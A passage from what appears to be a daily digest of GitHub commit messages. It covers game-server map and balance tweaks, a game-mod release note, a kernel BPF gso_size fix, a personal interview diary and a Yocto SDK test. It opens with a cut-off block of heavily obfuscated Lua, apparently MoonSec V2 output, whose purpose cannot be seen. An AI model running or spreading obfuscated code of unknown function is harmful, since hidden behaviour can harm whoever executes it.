d;o[e[i]]=o[e[f]][e[N]];_=_+l;e=n[_];d=e[i];c=o[e[u]];o[d+1]=c;o[d]=c[e[N]];_=_+l;e=n[_];o[e[a]]=x[e[w]];_=_+l;e=n[_];d=e[U];c=o[e[f]];o[d+1]=c;o[d]=c[e[P]];_=_+l;e=n[_];o[e[U]]=e[u];_=_+l;e=n[_];o[e[r]]=y[e[t]];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];o[e[a]]=y[e[h]];_=_+l;e=n[_];c=e[w];k=o[c]for e=c+1,e[D]do k=k..o[e];end;o[e[r]]=k;_=_+l;e=n[_];d=e[a]O,s=p(o[d](M(o,d+1,e[h])))S=s+d-1 b=0;for e=d,S do b=b+l;o[e]=O[b];end;_=_+l;e=n[_];d=e[U]o[d]=o[d](M(o,d+l,S))_=_+l;e=n[_];o[e[r]]=o[e[f]];break end while 3818==(d)/((0x1956-3302))do y[e[t]]=o[e[r]];break end;break;end break;end while(d)/((0x10479/(-#"MoonsecV2 deobfuscator 2020 free 100 percent"+(0xea6/50))))==792 do d=(487719)while(-#'balls'+(0xfe-137))>=c do d-= d d=(1896294)while(-#[[mama mo]]+(0x169-243))<c do d-= d o[e[k]]=o[e[w]][e[C]];break end while(d)/(((4160-0x842)+-#'If LocalPlayer equals Dumbass then while true do end'))==951 do local d;o[e[k]]=o[e[b]][e[C]];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[r]]=e[w];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[a]]=e[t];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[b]))_=_+l;e=n[_];x[e[u]]=o[e[s]];_=_+l;e=n[_];o[e[r]]=x[e[b]];_=_+l;e=n[_];o[e[s]]=o[e[t]][e[B]];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];o[e[a]]=e[f];_=_+l;e=n[_];o[e[k]]=e[t];_=_+l;e=n[_];o[e[s]]=e[b];_=_+l;e=n[_];o[e[r]]=e[f];_=_+l;e=n[_];o[e[s]]=e[t];_=_+l;e=n[_];o[e[U]]=e[f];_=_+l;e=n[_];o[e[s]]=e[u];_=_+l;e=n[_];o[e[k]]=e[w];_=_+l;e=n[_];o[e[U]]=e[t];_=_+l;e=n[_];o[e[i]]=e[w];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];d=e[k]o[d]=o[d](M(o,d+l,e[w]))_=_+l;e=n[_];x[e[h]]=o[e[i]];_=_+l;e=n[_];o[e[s]]=x[e[h]];_=_+l;e=n[_];o[e[s]]=o[e[u]][e[P]];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[k]]=e[h];_=_+l;e=n[_];o[e[a]]=e[t];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[U]]=e[h];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];o[e[k]]=e[h];_=_+l;e=n[_];o[e[s]]=e[t];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[i]]=e[t];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];d=e[r]o[d]=o[d](M(o,d+l,e[u]))_=_+l;e=n[_];x[e[u]]=o[e[s]];_=_+l;e=n[_];o[e[i]]=x[e[b]];_=_+l;e=n[_];o[e[a]]=o[e[b]][e[N]];_=_+l;e=n[_];o[e[a]]=e[b];_=_+l;e=n[_];o[e[U]]=e[u];_=_+l;e=n[_];o[e[r]]=e[b];_=_+l;e=n[_];o[e[U]]=e[b];_=_+l;e=n[_];o[e[s]]=e[w];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[r]]=e[t];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[s]]=e[h];_=_+l;e=n[_];o[e[i]]=e[u];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];d=e[a]o[d]=o[d](M(o,d+l,e[b]))_=_+l;e=n[_];x[e[b]]=o[e[r]];_=_+l;e=n[_];o[e[s]]=x[e[w]];_=_+l;e=n[_];o[e[i]]=o[e[f]][e[B]];_=_+l;e=n[_];o[e[i]]=e[f];_=_+l;e=n[_];o[e[r]]=e[h];_=_+l;e=n[_];o[e[a]]=e[w];_=_+l;e=n[_];o[e[U]]=e[u];_=_+l;e=n[_];o[e[k]]=e[b];_=_+l;e=n[_];o[e[a]]=e[u];_=_+l;e=n[_];o[e[U]]=e[h];_=_+l;e=n[_];o[e[a]]=e[h];_=_+l;e=n[_];o[e[i]]=e[h];_=_+l;e=n[_];o[…

---
## [ynot01/Yogstation](https://github.com/ynot01/Yogstation)@[b26f9f03e0...](https://github.com/ynot01/Yogstation/commit/b26f9f03e00ded330c6bc2e0efa54aec0f8500cb)
#### Thursday 2022-07-28 06:28:06 by Vaelophis Nyx

Makes donkpocket boxes on Box station into random spawners (#14822)

* Makes donk pockets station wide into random spawners

also adds a pile of donkpocket boxes to sec's back room and gives them a microwave

* reduced quanitity of donkpockets in sec by 4 boxes

* adds randodonks to the box mining base

* another commit I fundamentally disagree with

* reduces # of donk boxes in all kitchen variants

kill me

* microwave & gun/bomb swap

* fuck you byond map code

* fixes it. again.

---
## [saboooor/Cactie](https://github.com/saboooor/Cactie)@[9ce8696926...](https://github.com/saboooor/Cactie/commit/9ce86969267003730e31d302aecfadbfbd43d81e)
#### Thursday 2022-07-28 07:04:22 by saboooor

console.log fucking annoying ass Received one or more errors and finish github command

---
## [mc-oofert/tgstation](https://github.com/mc-oofert/tgstation)@[6fe0683a7b...](https://github.com/mc-oofert/tgstation/commit/6fe0683a7bc788a497dbce8771768e427d0dffb1)
#### Thursday 2022-07-28 07:07:22 by Jolly

[READY] [KC13] Showing "The Derelict" some love: General updates, aesthetic changes and misc (#67696)

With this PR I aim to make KC13 (TheDerelict.dmm), or Russian Station (whatever you guys call it) a tad bit more flavorful with its environment as well as somethings on the mapping side (like adding area icons!).
To preface, no, I'm not remapping anything here extensively. The general layout should be relatively the same (or should be in theory).

Halfway through naming the area icons I checked the wiki page and found out it was KC not KS, so, its KS13 internally.

Readability for turf icons are cool.
Also just making the ruin more eye appealing would be better.
General cleanup and changes will give new life to this rather.. loved? Hated? Loot pinata? Ruin.
The ruin also now starts completely depowered, like Old Station (its a Derelict, it makes no sense for it to still be powered after so long). As for some mild compensation, a few more batteries were sprinkled in to offset any issues. If there is any concern of "But they'll open the vault faster!", there were always 5 batteries that people used to make the vault SMES.
Lastly, giving it some "visual story telling" is cool, as mapping fluff goes.

I also added a subtle OOC hint that the SMES in the northern most solar room needs a terminal with the following:

SMES Jumpscare
As an aside, I aim to try and keep the feel of this ruin being "dated" while at the same time having some of our newer things. With that, certain things I'll opt out of using in favor of more "generic" structures to give KC13 that true "Its old but not really" feel and look.

---
## [mrwallace888/OWNH-Carson-System](https://github.com/mrwallace888/OWNH-Carson-System)@[9bacdd9e32...](https://github.com/mrwallace888/OWNH-Carson-System/commit/9bacdd9e323238eecc5c0cbd6b2186ecc179a373)
#### Thursday 2022-07-28 07:38:02 by Jack Foxtrot

Carson has received its `1.0` update!

# What's new?
### Ah jeez, what *hasn't* changed since release 0.4?

- The *Carson* star itself has been given tweaks and a fresh coat of paint.
- All planets have been completely rebuilt and revamped with new terrain as well as given proper generated heightmaps. No more taking the standard terrain texture and grayscaling it, save a few tweaks here and there.
- Tweaked gas giants.
-  Increased heightmap resolution to 1024 at the equator thanks to the introduction of LODs allowing for higher resolution while keeping frames stable. It allows for mountains, cracks, craters, and shorelines to be much more defined, and helps to keep things detailed when on the surface.
- Added another new planet named *Dester*.
- Added props such as trees and cacti to some planets, further helping to keep things detailed when on the surface.
- Added rain to Pyer.
- **Added new original flight music made by yours truly (will likely add the song to my music channel on YouTube)!**

# What now?
### Well, a couple things...
The original idea behind *Carson* was that I wanted to create a star system that felt immersive.  The celestial bodies showcased in *Outer Wilds* as well as the beautiful star systems made by other talented people are rather tiny; you can walk across the circumference of a planet in about a minute give or take, which isn't big at all.

I figured the best thing to do was make a much bigger star system, but also without being *too* big. It's a very sensitive scale to balance, mind you, because if you make it too big then it'll just become boring and likely frustrating. But too small and it breaks immersion.

*Carson* was inspired by the *Kerbol* system (as well as modded solar systems via *Kopernicus*) as shown in the famous spacecraft simulator *Kerbal Space Program*, as seen by *Carson*'s overall planetary designs.

What I wanted to figure out was just *how big* to make my objects. I settled around the size they are now. I estimated it to be the sweet spot for size. Again, I wanted my system to be big enough to be immersive, but not too big to be frustrating for people or boring. I had to take into consideration that the ship, vanilla-wise anyways, is pretty slow too.

Obviously, this mod has its flaws; a lot of them, mind you. But I've had fun developing this mod and some of the wonderful people like Trifid on the *Outer Wilds Modding* Discord server appreciate the creative decisions I took when developing it. After all, if I'm going to make a planet, *I'm going to make a planet*. Because planets are huge.

I hope you've enjoyed the effort I've put into this regardless. It definitely does something different from other systems in *New Horizons*, and that was pretty much the whole scope of the mod.

### This is not the end.
I want to clarify that I am nowhere near finished with this mod. Plenty of updates are planned for the future. I just figured that the current version, with all the blood, sweat, and tears put into it, was a nice stable update to release with. More celestial bodies or maybe even more stars are planned. We'll see. But I also don't want my mod to get *too* bloated file-wise. Unfortunately, most systems made with *New Horizons* grow outdated and broken as support is dropped for them, whether because of personal reasons or whatever else. I'll be doing my best to keep my system up-to-date and fix anything that breaks in the future. I'll need to anyways if I'm going to add new content. As *New Horizons* adds more features, you can bet your behind I'll be looking into adding them!

Thanks for downloading *Carson*, and stay tuned for more!

---
## [mrwallace888/OWNH-Carson-System](https://github.com/mrwallace888/OWNH-Carson-System)@[af58b84ffd...](https://github.com/mrwallace888/OWNH-Carson-System/commit/af58b84ffd2687802c964486d1fa407db6c6a994)
#### Thursday 2022-07-28 07:47:32 by Jack Foxtrot

*Carson* has received its `1.0` update!

# What's new?
### Ah jeez, what *hasn't* changed since release 0.4?

- The *Carson* star itself has been given tweaks and a fresh coat of paint.
- Added new nebular skybox.
- All planets have been completely rebuilt and revamped with new terrain as well as given proper generated heightmaps. No more taking the standard terrain texture and grayscaling it, save a few tweaks here and there.
-  Increased heightmap resolution to 1024 at the equator thanks to the introduction of LODs allowing for higher resolution while keeping frames stable. It allows for mountains, cracks, craters, and shorelines to be much more defined, and helps to keep things detailed when on the surface.
- Added another new planet named *Dester*.
- Added props such as trees and cacti to some planets, further helping to keep things detailed when on the surface.
- Added rain to Pyer.
- Tweaked gas giants.
- **New original flight music composed by yours truly (will likely post it on my YouTube music channel soon)!**

# What now?
### Well, a couple things...
The original idea behind *Carson* was that I wanted to create a star system that felt immersive.  The celestial bodies showcased in *Outer Wilds* as well as the beautiful star systems made by other talented people are rather tiny; you can walk across the circumference of a planet in about a minute give or take, which isn't big at all.

I figured the best thing to do was make a much bigger star system, but also without being *too* big. It's a very sensitive scale to balance, mind you, because if you make it too big then it'll just become boring and likely frustrating. But too small and it breaks immersion.

*Carson* was inspired by the *Kerbol* system (as well as modded solar systems via *Kopernicus*) as shown in the famous spacecraft simulator *Kerbal Space Program*, as seen by *Carson*'s overall planetary designs.

What I wanted to figure out was just *how big* to make my objects. I settled around the size they are now. I estimated it to be the sweet spot for size. Again, I wanted my system to be big enough to be immersive, but not too big to be frustrating for people or boring. I had to take into consideration that the ship, vanilla-wise anyways, is pretty slow too.

Obviously, this mod has its flaws; a lot of them, mind you. But I've had fun developing this mod and some of the wonderful people like Trifid on the *Outer Wilds Modding* Discord server appreciate the creative decisions I took when developing it. After all, if I'm going to make a planet, *I'm going to make a planet*. Because planets are huge.

I hope you've enjoyed the effort I've put into this regardless. It definitely does something different from other systems in *New Horizons*, and that was pretty much the whole scope of the mod.

### This is not the end.
I want to clarify that I am nowhere near finished with this mod. Plenty of updates are planned for the future. I just figured that the current version, with all the blood, sweat, and tears put into it, was a nice stable update to release with. More celestial bodies or maybe even more stars are planned. We'll see. But I also don't want my mod to get *too* bloated file-wise. Unfortunately, most systems made with *New Horizons* grow outdated and broken as support is dropped for them, whether because of personal reasons or whatever else. I'll be doing my best to keep my system up-to-date and fix anything that breaks in the future. I'll need to anyways if I'm going to add new content.

Thanks for downloading *Carson*, and stay tuned for more!

---
## [eun0115/android_kernel_samsung_universal7904](https://github.com/eun0115/android_kernel_samsung_universal7904)@[74b5af8090...](https://github.com/eun0115/android_kernel_samsung_universal7904/commit/74b5af80909e2615c29c56cf13555376667192ae)
#### Thursday 2022-07-28 08:00:33 by Maciej Żenczykowski

FROMGIT: bpf: Do not change gso_size during bpf_skb_change_proto()

This is technically a backwards incompatible change in behaviour, but I'm
going to argue that it is very unlikely to break things, and likely to fix
*far* more then it breaks.

In no particular order, various reasons follow:

(a) I've long had a bug assigned to myself to debug a super rare kernel crash
on Android Pixel phones which can (per stacktrace) be traced back to BPF clat
IPv6 to IPv4 protocol conversion causing some sort of ugly failure much later
on during transmit deep in the GSO engine, AFAICT precisely because of this
change to gso_size, though I've never been able to manually reproduce it. I
believe it may be related to the particular network offload support of attached
USB ethernet dongle being used for tethering off of an IPv6-only cellular
connection. The reason might be we end up with more segments than max permitted,
or with a GSO packet with only one segment... (either way we break some
assumption and hit a BUG_ON)

(b) There is no check that the gso_size is > 20 when reducing it by 20, so we
might end up with a negative (or underflowing) gso_size or a gso_size of 0.
This can't possibly be good. Indeed this is probably somehow exploitable (or
at least can result in a kernel crash) by delivering crafted packets and perhaps
triggering an infinite loop or a divide by zero... As a reminder: gso_size (MSS)
is related to MTU, but not directly derived from it: gso_size/MSS may be
significantly smaller then one would get by deriving from local MTU. And on
some NICs (which do loose MTU checking on receive, it may even potentially be
larger, for example my work pc with 1500 MTU can receive 1520 byte frames [and
sometimes does due to bugs in a vendor plat46 implementation]). Indeed even just
going from 21 to 1 is potentially problematic because it increases the number
of segments by a factor of 21 (think DoS, or some other crash due to too many
segments).

(c) It's always safe to not increase the gso_size, because it doesn't result in
the max packet size increasing.  So the skb_increase_gso_size() call was always
unnecessary for correctness (and outright undesirable, see later). As such the
only part which is potentially dangerous (ie. could cause backwards compatibility
issues) is the removal of the skb_decrease_gso_size() call.

(d) If the packets are ultimately destined to the local device, then there is
absolutely no benefit to playing around with gso_size. It only matters if the
packets will egress the device. ie. we're either forwarding, or transmitting
from the device.

(e) This logic only triggers for packets which are GSO. It does not trigger for
skbs which are not GSO. It will not convert a non-GSO MTU sized packet into a
GSO packet (and you don't even know what the MTU is, so you can't even fix it).
As such your transmit path must *already* be able to handle an MTU 20 bytes
larger then your receive path (for IPv4 to IPv6 translation) - and indeed 28
bytes larger due to IPv4 fragments. Thus removing the skb_decrease_gso_size()
call doesn't actually increase the size of the packets your transmit side must
be able to handle. ie. to handle non-GSO max-MTU packets, the IPv4/IPv6 device/
route MTUs must already be set correctly. Since for example with an IPv4 egress
MTU of 1500, IPv4 to IPv6 translation will already build 1520 byte IPv6 frames,
so you need a 1520 byte device MTU. This means if your IPv6 device's egress
MTU is 1280, your IPv4 route must be 1260 (and actually 1252, because of the
need to handle fragments). This is to handle normal non-GSO packets. Thus the
reduction is simply not needed for GSO packets, because when they're correctly
built, they will already be the right size.

(f) TSO/GSO should be able to exactly undo GRO: the number of packets (TCP
segments) should not be modified, so that TCP's MSS counting works correctly
(this matters for congestion control). If protocol conversion changes the
gso_size, then the number of TCP segments may increase or decrease. Packet loss
after protocol conversion can result in partial loss of MSS segments that the
sender sent. How's the sending TCP stack going to react to receiving ACKs/SACKs
in the middle of the segments it sent?

(g) skb_{decrease,increase}_gso_size() are already no-ops for GSO_BY_FRAGS
case (besides triggering WARN_ON_ONCE). This means you already cannot guarantee
that gso_size (and thus resulting packet MTU) is changed. ie. you must assume
it won't be changed.

(h) changing gso_size is outright buggy for UDP GSO packets, where framing
matters (I believe that's also the case for SCTP, but it's already excluded
by [g]).  So the only remaining case is TCP, which also doesn't want it
(see [f]).

(i) see also the reasoning on the previous attempt at fixing this
(commit fa7b83bf3b156c767f3e4a25bbf3817b08f3ff8e) which shows that the current
behaviour causes TCP packet loss:

  In the forwarding path GRO -> BPF 6 to 4 -> GSO for TCP traffic, the
  coalesced packet payload can be > MSS, but < MSS + 20.

  bpf_skb_proto_6_to_4() will upgrade the MSS and it can be > the payload
  length. After then tcp_gso_segment checks for the payload length if it
  is <= MSS. The condition is causing the packet to be dropped.

  tcp_gso_segment():
    [...]
    mss = skb_shinfo(skb)->gso_size;
    if (unlikely(skb->len <= mss)) goto out;
    [...]

Thus changing the gso_size is simply a very bad idea. Increasing is unnecessary
and buggy, and decreasing can go negative.

Fixes: 6578171a7ff0 ("bpf: add bpf_skb_change_proto helper")
Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
Cc: Dongseok Yi <dseok.yi@samsung.com>
Cc: Willem de Bruijn <willemb@google.com>
Link: https://lore.kernel.org/bpf/CANP3RGfjLikQ6dg=YpBU0OeHvyv7JOki7CyOUS9modaXAi-9vQ@mail.gmail.com
Link: https://lore.kernel.org/bpf/20210617000953.2787453-2-zenczykowski@gmail.com

(cherry picked from commit 364745fbe981a4370f50274475da4675661104df https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf-next.git/commit/?id=364745fbe981a4370f50274475da4675661104df )
Test: builds, TreeHugger
Bug: 158835517
Bug: 188690383
Signed-off-by: Maciej Żenczykowski <maze@google.com>
Change-Id: I0ef3174cbd3caaa42d5779334a9c0bfdc9ab81f5

---
## [TenameACAccount/Foundation-19](https://github.com/TenameACAccount/Foundation-19)@[3198c7d257...](https://github.com/TenameACAccount/Foundation-19/commit/3198c7d257961f97b45ae128cdc72b657a2ed36e)
#### Thursday 2022-07-28 08:17:02 by ivanmixo

Fixes MTF heli runtime (#547)

* Fixes mtf heli

* Fuck you die

* Whoops funny haha

* Cheeky juke fix

---
## [TenameACAccount/Foundation-19](https://github.com/TenameACAccount/Foundation-19)@[befabcec33...](https://github.com/TenameACAccount/Foundation-19/commit/befabcec333347ce6b918d67d4c884b9e0dcefea)
#### Thursday 2022-07-28 08:17:02 by TenameACAccount

more dcz changes yay (#548)

* Update site53-1.dmm

* fallout 5 on the byond engine

* fuck you box

Co-authored-by: UserU <37943518+User-U-U@users.noreply.github.com>

---
## [TenameACAccount/Foundation-19](https://github.com/TenameACAccount/Foundation-19)@[96615f6506...](https://github.com/TenameACAccount/Foundation-19/commit/96615f650661292a92b79eb1983064556188cb37)
#### Thursday 2022-07-28 08:17:02 by harryob

LFification, again, maybe for real this time (#568)

* what is this cursed shit

* shut up PLEASE

* everything non-LF should be LFd

Co-authored-by: tichys <tichman27@gmail.com>

---
## [VaelophisNyx/Yogstation](https://github.com/VaelophisNyx/Yogstation)@[5bbc6a2401...](https://github.com/VaelophisNyx/Yogstation/commit/5bbc6a2401361e71f4c6fb0ad173900153603787)
#### Thursday 2022-07-28 08:18:05 by Marmio64

Sinful demon changes + re-enable (#14345)

* first wave of demon changes

many changes
1: gluttonous demons hunger 3x as fast as normal people
2: all demons no longer enter softcrit (still can enter hardcrit), are geneless, dont suffocate in crit, and have stable hearts.
3: true demon form deals 20 damage instead of 24 (wrath is 24 instead of 28). Health is lowered to 160 and health regen per hit is now 8 instead of 10. To compensate, they are ever so slightly faster, but are still slower than everyone but podpeople. Demons also lose 2 hp every life tick (a life tick is generally 2 seconds, so 2 hp every 2 seconds), so as to try to deter you from staying in demon form the entire round.
4: objectives are made a bit less murderbone-ey.
5: sinful demon spawns slightly less often

* re enables event

* fixes

* removes chance for envy to get an identity theft objective

* word change

* sinful demon is rarer still

honestly, they arent very interesting if they happen too much, so i'd like them to mildly rare

Co-authored-by: Jamie D <993128+JamieD1@users.noreply.github.com>

---
## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[6c5889fb54...](https://github.com/treckstar/yolo-octo-hipster/commit/6c5889fb5485f1b33b22d8eb9c90ad28f5a6dc2b)
#### Thursday 2022-07-28 08:22:03 by treckstar

People listen up don't stand so close, I got somethin that you all should know. Holy matrimony is not for me, I'd rather die alone in misery.

---
## [etet0428/git-training](https://github.com/etet0428/git-training)@[b19f92f528...](https://github.com/etet0428/git-training/commit/b19f92f528a08e9829650ae8e048dda7073bf533)
#### Thursday 2022-07-28 09:00:36 by sisiqjsk

report card: FUCK YOU

Signed-off-by: sisiqjsk <sisiqjsk@gmail.com>

---
## [DrDuckedGoose/BeeStation-Hornet](https://github.com/DrDuckedGoose/BeeStation-Hornet)@[3249b4560b...](https://github.com/DrDuckedGoose/BeeStation-Hornet/commit/3249b4560b568fe762f2a695a6427bab7c56c649)
#### Thursday 2022-07-28 09:55:34 by DrDuckedGoose

Lasso Fix (#7345)

* Merge https://github.com/BeeStation/BeeStation-Hornet into annoying-thing Merge conflicts :)

* Initial - 23 7 22

- Doesn't allow dead mobs to be ridden
- Space walk is now specific to the mob

* Actually Fix It - 23 7 22

* Fuck - 23 7 22

- Fix being able to tame human
- Fix being able to tame the dead

* Update carp_lasso.dm

* You boys fucked buckle code - 23 7 22

* Update carp_lasso.dm

* Update riding.dm

* fix icon - 24 7 22

* Review Changes - 24 7 22

---
## [mrakgr/The-Spiral-Language](https://github.com/mrakgr/The-Spiral-Language)@[3ad3712e11...](https://github.com/mrakgr/The-Spiral-Language/commit/3ad3712e119bc0effc24f31d4f593d0b191ea21b)
#### Thursday 2022-07-28 10:21:38 by Marko Grdinić

"8:15am. I am up. Tonight was hell. The Neurolabs interview jacked my mind and I spent all night thinking how to do the write-up. I couldn't get any proper sleep. Before I write it down, let me check the email. Nothing. I haven't gotten a reply from the AssemlyAI HR drone regarding when she wants to reschedule. Last night she told me her computer broke down and cancelled it. Neither have a gotten a reply from the TensTorrent guys.

Given my current lack of sleep, the GI interview at 9:30pm is going to be a pain.

8:20am. Let me get started. It is not like I am particularly obsessed at working at Neurolabs, but I smell a business opportunity here. It might be possible to negotiate a salary far above their given range. Even better, my advice would be generic across startups, so even if I do not get in here, I could make use of these ideas elsewhere. It would not be surprising if there are highly paid research engineers doing what I would suggest. Let me do the writeup, and then I will wash my hands clear of Neurolabs. Either way I thank them for inspiring me. The possibility they presented fired me up.

///

After the interview, I had some time to think about various paths I could take at your company. Let me go over my ideas and make a few proposals.

1) Optimize the low level while keeping the architecture intact. Potential impact: low.

By this I mean, diving into the codebase looking for yaks to shave, and checking whether you've made any coding errors in order to fix them. I am not too hopeful about this. I'd of course do this as a part of my responsibilities at the company, but it is wishful thinking to expect that a lot would fall out from this. From a programming standpoint, NNs are simple: matrix multiplication/convolution followed by a map operation, or a fold and then map. There simply isn't that much I can do to optimize such pipelines directly.

It would not be useless to try though since any improvements made in such a manner would directly decrease latency as well as resource usage. Also performance aside, the rewrites I could do would improve readability and maintainability of the overall codebase.

2) Layerwise concurrency. Potential impact: low-medium.

During inference, you are no doubt running your models with `no_grad` on. But even if you do that, before the next request could be processed, it would need to wait before the previous one currently in the pipeline goes through the entirety of it, layer by layer. Instead of doing it like that, it might be better to make each layer asynchronous. That way as long as there are enough requests, every layer could be active at any given time.

Whether this is worth doing depends on the model and how large the individual requests are. I know that sending a high res image even through a small convolution-based model (by today's standards) like VGG, can take a few seconds and take up most of the device memory so there simply might not be enough capacity to make the layers concurrent on a single instance. You've mentioned you used EfficientNets and I haven't asked which model, but all of them are sizable, to the point that if you wanted to keep the whole system hot while running on high res images, it would be necessary to distribute models across cloud instances. Once you are doing that, the latency goes down the toilet. Large distributed models are bandwidth bound, which is worse than being compute or memory bound.

It would take some work to tune this proposal right. A big issue is that the different layers once made async would compete for memory and computation of the entire system, and this would require management.

Also, one problematic aspect is trying to do this in Python. I know from experience that it has poor concurrency capabilities, so it might be worth looking into languages that are good at it, like Elixir, Julia or F#.

3) Cloud provider diversification. Potential impact: high.

Large traders of financial assets don't use a single broker. Different brokers have different execution quality as well as cost per transaction. So it makes sense to keep track of that aspect of their business and put pressure on their providers by having them compete against each other. The same plan makes sense for cloud providers.

Unlike with financial assets, there is no direct way to arbitrage the prices of cloud provider services so at any given time it is inevitable that their quotations will differ. If instead of just at Google Cloud, you had accounts at AWS and Azure, you could route to whomever is the cheapest at any given time. Moreover, this would broaden the pool of spot offerings you could access in order to drastically reduce your costs by dynamically rerouting the requests to different cloud providers. Furthermore, besides the big 3, there are niche cloud providers that have cheaper prices than any of them, and it would be worth considering sending business their way. An example of a niche provider that competes on price and specializes in ML: Lambda Labs.

I won't pretend to be familiar with the niche providers, but it is worth shopping around for bargains. I am not suggesting to drop GC in favor of anything in particular. Instead diversifying your cloud providers can only bring benefits. A routing system would need to be built by an expert, and it would need to be maintained afterwards, but depending on your cloud bill, the savings could be significant.

An added advantage is that once you have such a system, you could make it a part of your product offerings and pitch it to other ML startups.

4) Alternative hardware. Potential impact: low-high.

Since having memory close to the computation has the potential to give huge efficiency benefits, future ML hardware will be designed so as to maximize the memory locality per computational core. TensTorrent, Groq and Graphcore are the upcoming leaders in my eyes, and are starting to roll out cloud offerings. Besides them there are a few dozen AI hardware startups, a lot of them focused solely on inference. If you read the news, you will see that all the large companies are coming up with their own AI accelerators.

I won't lie about their current state though.

https://semianalysis.substack.com/p/nvidia-in-the-hot-seat

I'd have expected the 3 companies I mentioned to handily beat GPUs given the memory locality advantage their devices have, but seem to be struggling against GPUs and outright flee the match in some cases. When they win, it is never a significant advantage of over an order magnitude, but something unremarkable and frankly disappointing. But I do believe in the reasoning behind their design. Designing the AI chips to operate more like the brain will eventually win out over GPUs when it comes to ML. Also these are just benchmarks, and Nvidia has spent engineering effort optimizing them that would not be realistic in real life cases, so the situation might not be as bad as it seems.

I do not have any suggestions at the moment regarding specific products. My professional interest was on the training, rather than the inference side, but just like with cloud providers, it might be worth shopping around for something that matches your needs. We are in the midst of a hardware renaissance and there are more chip startups than ever. They will no doubt have immature software stacks, but my specialty as a programmer is making ML libraries. The reason why I created the Spiral programming language is to make it easy to create ML libraries for novel kinds of hardware, so I am well suited to take advantage of such offerings.

---

Let me review. Suppose I were to start work at your company, I'd do a codebase review to see if I can pluck any low hanging fruit to improve performance. But after that, if your cloud bill is significant I'd definitely want to look into diversifying your cloud providers. Besides that I'd want to look at metrics and see if I could do anything to improve the utilization of your individual cloud instances. The last option depends on whether you'd want me to be bold and entrepreneurial. Whether the point in time is right to bet on novel AI hardware is something that would require some research. Who knows how much has changed in the last year since I was in the industry.

I've made a few suggestions. What do you think?

///

Improving inference which is what they want me to do is a rough job. I'd definitely have an easier time working on some front end. There simply just isn't an easy way to give them what they want. They already have 4 researchers working on their models. I could come in, but despite my ability, programming skill isn't magic. I can't do what the hardware can't do.

https://angel.co/company/neurolabs

As I thought, Patric Foulop which I interviewed with was the founder. You can definitely tell the difference between talking to somebody in his position and some HR drone.

Hmmm...

Looking at the company I do get the sense that it is too small to support me properly. It has a 70-140k range, it might be that my own price might simply be too expensive for the service I would be rendering to them.

For example, if it turned out their cloud bill was something like a million a year, and I was tasked with buiding a system that could reduce that by 50-90%, I could negotiate a large salary. But looking at random ways to try an improve inference performance is not really up my alley. AI chips are a good idea for this purpose, I could really take advantage of those, but the company is unlikely to want to go that way. It might be simply too early to put that plan into action.

No doubt they are using PyTorch to run their models. I'd go in and do what? If it was something like Tesla I could do things like fuse the matrix multiplies with the activations and so on, but who is going to put in the effort to do something like that here? The company does not have the scale to support their own ML library which is what going up a step in performance with respect to the mainstream ones requires.

11:20am. The vanilla fashion to make me the most effective is to work on the models directly along with the researchers, that would give me the initiative to make the necessary changes.

11:45am. I am thinking about it. I'll think I'll replace the last part. I am approaching this from the wrong angle. All these ideas are worth pursuing, but it depends on the price.

11:50am. Let me do the chores here.

12pm. Let me have breakfast here, I won't send the above just yet. I want to refine the message."

---
## [openembedded/openembedded-core](https://github.com/openembedded/openembedded-core)@[392a6db236...](https://github.com/openembedded/openembedded-core/commit/392a6db23638307f7ff5a250e0f31590effed089)
#### Thursday 2022-07-28 10:48:07 by Alexander Kanavin

selftest/meta_ide: add a test for running SDK tests directly in a yocto build

There's been a recent discussion about how we can make the Yocto SDK
experience better [1]. One of the ideas was to eliminate the SDK
as a separate artefact altogether and simply provide everything
that the SDK and eSDKs do directly in a yocto build. This does not
mean that people have to 'learn Yocto', but rather that the integrators
should provide a well-functioning sstate cache infrastructure (same as
with minimal eSDK, really), and a few wrapper scripts for setting up the build
and the SDK environment that run layer setup and bitbake behind the scenes.

[1] https://lists.openembedded.org/g/openembedded-architecture/topic/thoughts_on_the_esdk/90990557

So without further ado, here's how you get a 'SDK' without building one:

1. Set up all the needed layers and a yocto build directory.

2. Run:
$ bitbake meta-ide-support
$ bitbake -c populate_sysroot gtk+3
(or any other target or native item that the application developer would need)
$ bitbake populate-sysroots

3. Set up the SDK environment:
. tmp/deploy/images/qemux86-64/environment-setup-core2-64-poky-linux
(adjust accordingly)

Et voila! The Unix environment is now set up to use the cross-toolchain from
Yocto, exactly as in the SDK. And devtool/bitbake are available to extend it,
exactly as in the eSDK.

Theare are numerous benefits here: no need to produce, test, distribute and maintain
separate SDK artifacts. No two separate environments for the yocto build and the SDK.
Less code paths where things can go wrong. Less awkward, gigantic tarballs. Less
SDK update headaches: 'updating the SDK' simply means updating the yocto layers with
git fetch or layer management tooling. Built-in SDK extensibility: just run bitbake
again to add more things to the sysroot, or add layers if even more things are required.

How is this tested?

Exactly same as the regular SDK:
